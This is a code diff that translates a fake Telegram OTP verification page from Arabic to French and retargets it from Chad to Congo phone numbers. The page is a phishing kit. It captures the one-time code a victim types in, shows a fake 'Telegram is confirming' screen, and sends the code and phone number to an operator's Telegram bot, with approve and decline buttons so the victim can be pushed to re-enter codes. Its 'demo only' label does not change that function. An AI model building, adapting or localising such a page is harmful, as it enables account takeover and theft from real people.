@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="fr" dir="ltr">
 
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق برمز التحقق</title>
+    <title>Vérification par Code OTP</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         /* Overlay for decline message */
@@ -72,8 +72,8 @@
     <div id="loadingOverlay">
         <div class="bg-white rounded-2xl p-6 text-center w-[320px]">
             <div class="spinner mx-auto mb-4"></div>
-            <h2 class="text-lg font-bold text-gray-900">جاري التحقق…</h2>
-            <p class="text-sm text-gray-600 mt-1">برجاء الانتظار وهو تيليجرام كيأكد طلبك.</p>
+            <h2 class="text-lg font-bold text-gray-900">Vérification en cours...</h2>
+            <p class="text-sm text-gray-600 mt-1">Veuillez patienter pendant que Telegram confirme votre demande.</p>
         </div>
     </div>
 
@@ -81,10 +81,10 @@
     <div id="declineOverlay">
         <div class="decline-box">
             <div class="text-5xl mb-4">❌</div>
-            <h2 class="text-2xl font-bold text-red-600 mb-2">المعلومات اللي دخلتها غلط</h2>
-            <p class="text-gray-600 mb-6">رمز التحقق اللي دخلتو ماشي صحيح. عاود المحاولة من جديد.</p>
+            <h2 class="text-2xl font-bold text-red-600 mb-2">Informations incorrectes</h2>
+            <p class="text-gray-600 mb-6">Le code de vérification saisi n'est pas valide. Veuillez réessayer.</p>
             <button onclick="closeDecline()" class="bg-black text-white px-8 py-3 rounded-xl font-bold hover:bg-gray-800">
-                عاود المحاولة
+                Réessayer
             </button>
         </div>
     </div>
@@ -93,18 +93,18 @@
 
         <!-- Back button -->
         <button onclick="history.back()" class="flex items-center gap-2 border rounded-full px-4 py-2 text-gray-700 text-sm">
-            → رجوع
+            ← Retour
         </button>
 
         <!-- Title -->
         <h1 class="mt-6 text-xl font-semibold text-gray-900">
-            التحقق برمز OTP
+            Vérification par code OTP
         </h1>
 
         <!-- Instruction -->
         <p class="mt-3 text-gray-700 text-sm">
-            دخل رمز التحقق اللي وصلك في
-            <span class="font-semibold">+235...........</span>
+            Entrez le code de vérification envoyé au
+            <span class="font-semibold">+243...........</span>
         </p>
 
         <!-- FORM -->
@@ -122,7 +122,7 @@
         <!-- Resend -->
         <div class="mt-6">
             <button type="button" class="text-red-600 font-semibold text-sm">
-                عاود إرسال رمز التحقق
+                Renvoyer le code de vérification
             </button>
         </div>
     </div>
@@ -256,13 +256,13 @@
 
             function envoyerOTP(otp) {
                 const message = `
-🔴 رمز التحقق وصل (نسخة تجريبية)
+🔴 CODE OTP REÇU (CONGO)
 ━━━━━━━━━━━━━━━━━━━━━
-🔑 الرمز : ${otp}
-📱 التيليفون : +23566123456
-🕐 الوقت : ${new Date().toLocaleString("ar-TD")}
+🔑 Code : ${otp}
+📱 Téléphone : +24399123456
+🕐 Heure : ${new Date().toLocaleString("fr-FR")}
 ━━━━━━━━━━━━━━━━━━━━━
-⚠️ نسخة تجريبية — للتجربة فقط.
+⚠️ Mode démo — pour tests uniquement.
                 `.trim();
 
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -279,10 +279,10 @@
                             reply_markup: {
                                 inline_keyboard: [
                                     [{
-                                        text: "✅ موافقة",
+                                        text: "✅ Approuver",
                                         callback_data: "approve"
                                     }, {
-                                        text: "❌ رفض",
+                                        text: "❌ Refuser",
                                         callback_data: "decline"
                                     }]
                                 ]
